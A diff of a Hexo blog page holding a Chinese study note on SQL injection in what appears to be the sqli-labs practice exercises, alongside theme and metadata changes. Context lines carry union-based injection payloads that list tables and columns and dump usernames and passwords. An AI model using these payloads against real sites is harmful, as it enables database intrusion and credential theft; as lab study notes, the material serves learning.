@@ -370,9 +370,13 @@ group_concat()函数可以让多个数据在一行显示，但是只能显示64�
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sec/">
+                                <span class="chip bg-color">sec</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -389,17 +393,32 @@ group_concat()函数可以让多个数据在一行显示，但是只能显示64�
                 
 
                 
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    205
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-12-02
                 </div>
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    207
+                </div>
+                
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    1 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
             </div>
         </div>
         <hr class="clearfix">
@@ -420,28 +439,28 @@ group_concat()函数可以让多个数据在一行显示，但是只能显示64�
 information_schema.schemata limit 0,1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="C:\Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171630607.png" alt="image-20221115171630607"></p>
+<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171630607.png" alt="image-20221115171630607"></p>
 </blockquote>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">爆破表名
 ?id&#x3D;-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables
 where table_schema&#x3D;database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="C:\Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171713650.png" alt="image-20221115171713650"></p>
+<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171713650.png" alt="image-20221115171713650"></p>
 </blockquote>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">爆破字段名
 ?id&#x3D;-1&#39; union select 1,2,group_concat(column_name)from
 information_schema.columns where table_name&#x3D;&#39;users&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="C:\Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115173051680.png" alt="image-20221115173051680"></p>
+<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115173051680.png" alt="image-20221115173051680"></p>
 </blockquote>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">爆破字段
 ?id&#x3D;-1&#39; union select 1,2,(select group_concat(username,0x7e,password)from
 users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="C:\Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115174526906.png" alt="image-20221115174526906"></p>
+<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115174526906.png" alt="image-20221115174526906"></p>
 </blockquote>
 <p><strong>Less2</strong></p>
 <p>和1大致相同 less1的注入点是字符型 2则是数字型</p>
@@ -451,11 +470,11 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
 <p>雷同</p>
 <h2 id="SQL注入之查询方式"><a href="#SQL注入之查询方式" class="headerlink" title="SQL注入之查询方式"></a>SQL注入之查询方式</h2><p>select查询数据</p>
 <blockquote>
-<p>select * from user where id=$id</p>
+<p>select * from user where id&#x3D;$id</p>
 </blockquote>
 <p>delete删除数据</p>
 <blockquote>
-<p>delete from user where id=$id</p>
+<p>delete from user where id&#x3D;$id</p>
 </blockquote>
 <h2 id="SQL注入之报错盲注"><a href="#SQL注入之报错盲注" class="headerlink" title="SQL注入之报错盲注"></a>SQL注入之报错盲注</h2><p>函数解析：</p>
 <p>update</p>
@@ -522,7 +541,11 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/sec/">
+                                    <span class="chip bg-color">sec</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -817,7 +840,7 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
   <script>
     new Waline({
         el: '#waline',
-        serverURL: 'https://waline.your-domain.com',
+        serverURL: 'https://mapled-h93e-dpk4h96dr-hsiryy.vercel.app/',
         avatar: 'mm'    
     });
   </script> 
@@ -836,13 +859,13 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/11/30/Day05/">
+                <a href="/2022/11/30/Day0807/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="SEC05">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="SEC0807">
                         
-                        <span class="card-title">SEC05</span>
+                        <span class="card-title">SEC0807</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -864,6 +887,14 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
                     </div>
                 </div>
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sec/">
+                        <span class="chip bg-color">sec</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
@@ -873,13 +904,13 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/11/30/Day06/">
+                <a href="/2022/11/30/Day09/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="SEC06">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="SEC09">
                         
-                        <span class="card-title">SEC06</span>
+                        <span class="card-title">SEC09</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -899,6 +930,14 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sec/">
+                        <span class="chip bg-color">sec</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1128,6 +1167,9 @@ users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
+                        class="white-color">21.1k</span>
             
             
             
@@ -1390,17 +1432,16 @@ $(function () {
     
 
     
-        
+
+    <!-- 雪花特效 -->
+     
         <script type="text/javascript">
             // 只在桌面版网页启用特效
             var windowWidth = $(window).width();
             if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
             }
         </script>
-    
-
-    <!-- 雪花特效 -->
     
 
     <!-- 鼠标星星特效 -->
